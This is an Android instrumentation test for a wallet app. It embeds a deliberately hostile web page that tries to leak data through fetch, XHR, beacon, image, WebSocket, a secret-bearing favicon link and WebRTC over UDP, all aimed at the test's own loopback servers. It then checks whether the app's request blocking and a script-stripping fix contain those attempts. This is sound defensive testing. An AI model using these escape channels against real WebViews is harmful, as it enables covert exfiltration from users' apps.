package app.getvela.wallet

import android.webkit.JavascriptInterface
import android.webkit.WebResourceRequest
import android.webkit.WebResourceResponse
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.webkit.WebViewCompat
import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import org.junit.Assert.assertEquals
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import java.io.ByteArrayInputStream
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress
import java.net.ServerSocket
import java.util.Collections
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/**
 * Spec 076, probe P2 — **a measurement, not a feature**.
 *
 * FR-005 says the page cannot speak while it is being checked. That matters
 * because verification LOADS the page, and loading it runs its code: it is the
 * attacker's page, and a page that can tell it is being verified could simply
 * tell its server. Unlike phase B's single-file test — where the page carries a
 * friendly `default-src 'none'` of its own — here the page is hostile and only
 * the APP's blocking stands between it and the network.
 *
 * On Android that blocking is `shouldInterceptRequest`: `null` for the MAIN
 * frame, because letting the engine fetch it is what preserves the fingerprint
 * P1 is about, and an empty response for everything else.
 *
 * So: a page that tries every way out it has, and a server — in this process —
 * that says what actually arrived. Including a UDP socket, because content
 * blockers govern HTTP and **WebRTC does not go over HTTP** (076 open question
 * 2). If something escapes, FR-005 has a hole and the spec must say so rather
 * than promise what it cannot keep.
 */
@RunWith(AndroidJUnit4::class)
class SignerPageEscapeProbeTest {

    private class Caught(
        val http: MutableList<String>,
        val udp: MutableList<String>,
        val tcp: ServerSocket,
        val datagram: DatagramSocket
    )

    /** A page that tries every way out, against this test's own servers. */
    private fun hostilePage(port: Int, udpPort: Int) = """
        <!doctype html><html><head><meta charset="utf-8"><title>escape</title>
        <link rel="icon" href="http://127.0.0.1:$port/favicon-leak.ico?secret=theaddress">
        </head>
        <body><p>hostile</p><script>
        window.__tried = {};
        (async () => {
          const at = (what, how) => { window.__tried[what] = how; };
          try { await fetch('http://127.0.0.1:$port/fetch'); at('fetch', 'RESOLVED'); }
          catch (e) { at('fetch', 'refused'); }
          try {
            const x = new XMLHttpRequest();
            x.open('GET', 'http://127.0.0.1:$port/xhr', false);
            x.send();
            at('xhr', 'RESOLVED');
          } catch (e) { at('xhr', 'refused'); }
          try { at('beacon', navigator.sendBeacon('http://127.0.0.1:$port/beacon', 'x') ? 'queued' : 'refused'); }
          catch (e) { at('beacon', 'refused'); }
          try {
            const img = new Image();
            img.src = 'http://127.0.0.1:$port/img.png';
            at('image', 'attempted');
          } catch (e) { at('image', 'refused'); }
          try {
            await new Promise((done) => {
              const s = new WebSocket('ws://127.0.0.1:$port/ws');
              s.onopen = () => { at('websocket', 'RESOLVED'); done(); };
              s.onerror = () => { at('websocket', 'refused'); done(); };
              setTimeout(() => { at('websocket', 'timeout'); done(); }, 2000);
            });
          } catch (e) { at('websocket', 'refused'); }
          // The one a content blocker does not govern: WebRTC leaves over UDP.
          try {
            if (typeof RTCPeerConnection !== 'function') { at('webrtc', 'absent'); }
            else {
              const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:$udpPort' }] });
              pc.createDataChannel('x');
              await pc.setLocalDescription(await pc.createOffer());
              await new Promise((done) => setTimeout(done, 2500));
              at('webrtc', 'attempted state=' + pc.iceGatheringState);
              pc.close();
            }
          } catch (e) { at('webrtc', 'threw ' + e.name); }
          Escape.report(JSON.stringify(window.__tried));
        })();
        </script></body></html>
    """.trimIndent()

    private class Bridge(val latch: CountDownLatch, val said: AtomicReference<String>) {
        @JavascriptInterface
        fun report(text: String) {
            said.set(text)
            latch.countDown()
        }
    }

    /** The hostile page's bytes, served at /page.html so the load is a real navigation. */
    private var pageBytes: ByteArray = ByteArray(0)

    private fun listen(): Caught {
        val tcp = ServerSocket(0, 16, InetAddress.getByName("127.0.0.1"))
        val udp = DatagramSocket(0, InetAddress.getByName("127.0.0.1"))
        val http = Collections.synchronizedList(mutableListOf<String>())
        val datagrams = Collections.synchronizedList(mutableListOf<String>())
        Thread {
            while (!tcp.isClosed) {
                try {
                    val client = tcp.accept()
                    val reader = BufferedReader(InputStreamReader(client.getInputStream()))
                    val line = reader.readLine() ?: "(empty)"
                    http.add(line)
                    val body = if (line.contains("/page.html")) pageBytes else "ok".toByteArray()
                    val head = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\n" +
                        "Content-Length: ${'$'}{body.size}\r\nConnection: close\r\n\r\n"
                    client.getOutputStream().write(head.toByteArray(Charsets.US_ASCII))
                    client.getOutputStream().write(body)
                    client.getOutputStream().flush()
                    client.close()
                } catch (_: Exception) {
                    // closed, or the client went away
                }
            }
        }.also { it.isDaemon = true }.start()
        Thread {
            val buffer = ByteArray(2048)
            while (!udp.isClosed) {
                try {
                    val packet = DatagramPacket(buffer, buffer.size)
                    udp.receive(packet)
                    datagrams.add("${packet.length} bytes from ${packet.address}")
                } catch (_: Exception) {
                    // closed
                }
            }
        }.also { it.isDaemon = true }.start()
        return Caught(http, datagrams, tcp, udp)
    }

    private class Result(
        val said: String,
        val http: List<String>,
        val udp: List<String>,
        val intercepted: List<String>
    )

    /**
     * Load the hostile page by a REAL navigation, with the app's blocking on,
     * and report what actually reached the servers.
     *
     * @param stripEscapeHatches removes `WebSocket` and `RTCPeerConnection`
     *   from the JS environment BEFORE any page script runs — the candidate
     *   fix for the two holes `shouldInterceptRequest` cannot cover.
     */
    private fun run(stripEscapeHatches: Boolean): Result {
        val caught = listen()
        pageBytes = hostilePage(caught.tcp.localPort, caught.datagram.localPort)
            .toByteArray(Charsets.UTF_8)
        val documentUrl = "http://127.0.0.1:${caught.tcp.localPort}/page.html"
        val answered = CountDownLatch(1)
        val said = AtomicReference("(nothing)")
        val instrumentation = InstrumentationRegistry.getInstrumentation()
        var view: WebView? = null
        val intercepted = Collections.synchronizedList(mutableListOf<String>())

        instrumentation.runOnMainSync {
            val webView = WebView(instrumentation.targetContext)
            view = webView
            webView.settings.javaScriptEnabled = true
            webView.addJavascriptInterface(Bridge(answered, said), "Escape")
            if (stripEscapeHatches) {
                // Before ANY page script. `shouldInterceptRequest` never sees a
                // WebSocket handshake and cannot see UDP at all, so the only
                // place to stop them is the environment the page runs in.
                WebViewCompat.addDocumentStartJavaScript(
                    webView,
                    """
                    delete window.WebSocket;
                    delete window.RTCPeerConnection;
                    delete window.webkitRTCPeerConnection;
                    delete window.RTCDataChannel;
                    """.trimIndent(),
                    setOf("*")
                )
            }
            webView.webViewClient = object : WebViewClient() {
                override fun shouldInterceptRequest(
                    v: WebView?,
                    request: WebResourceRequest?
                ): WebResourceResponse? {
                    val url = request?.url?.toString() ?: return null
                    // FR-005: the MAIN frame goes to the engine — that is what
                    // keeps the fingerprint P1 depends on. Everything else gets
                    // an empty response and never reaches the network.
                    if (request.isForMainFrame) {
                        intercepted.add("main:$url")
                        return null
                    }
                    intercepted.add("blocked:$url")
                    return WebResourceResponse(
                        "text/plain",
                        "utf-8",
                        ByteArrayInputStream(ByteArray(0))
                    )
                }
            }
            webView.loadUrl(documentUrl)
        }

        assertTrue("the page never reported", answered.await(60, TimeUnit.SECONDS))
        instrumentation.runOnMainSync { view?.destroy() }
        Thread.sleep(2000)
        caught.tcp.close()
        caught.datagram.close()
        return Result(said.get(), caught.http.toList(), caught.udp.toList(), intercepted.toList())
    }

    @Test
    fun what_a_blocked_webview_still_lets_out() {
        val r = run(stripEscapeHatches = false)
        println("P2 · page says: ${r.said}")
        println("P2 · HTTP arrived: ${r.http}")
        println("P2 · UDP arrived: ${r.udp}")
        println("P2 · interceptor: ${r.intercepted}")

        // What `shouldInterceptRequest` DOES cover. These are the guarantee.
        val leakedSubresources = r.http.filter {
            it.contains("/fetch") || it.contains("/xhr") || it.contains("/beacon") || it.contains("/img")
        }
        assertEquals(
            "fetch/XHR/beacon/image escaped a blocked WebView: $leakedSubresources",
            0,
            leakedSubresources.size
        )

        // And what it does NOT. Recorded, not asserted away: a WebSocket
        // handshake never reaches `shouldInterceptRequest`, and WebRTC does not
        // go over HTTP at all, so neither is governed by it (076 open q. 2).
        println("P2 · WebSocket escaped: ${r.http.any { it.contains("/ws") }}")
        println("P2 · WebRTC/UDP escaped: ${r.udp.isNotEmpty()}")
        println("P2 · the PAGE's own favicon escaped: ${r.http.any { it.contains("favicon-leak") }}")
    }

    @Test
    fun removing_the_escape_hatches_closes_both_holes() {
        val r = run(stripEscapeHatches = true)
        println("P2b · page says: ${r.said}")
        println("P2b · HTTP arrived: ${r.http}")
        println("P2b · UDP arrived: ${r.udp}")
        println("P2b · interceptor: ${r.intercepted}")

        // The document itself is meant to arrive — that is the navigation the
        // whole design keeps. `/favicon.ico` is the BROWSER's own request and
        // carries nothing of the page's; `/favicon-leak.ico?secret=…` is the
        // page's, and if THAT arrives a hostile page has a third way out.
        val pageControlled = r.http.filterNot {
            it.contains("/page.html") || it.contains("GET /favicon.ico")
        }
        assertEquals("the page still got something out: $pageControlled", 0, pageControlled.size)
        assertEquals("UDP still escaped: ${r.udp}", 0, r.udp.size)
    }
}
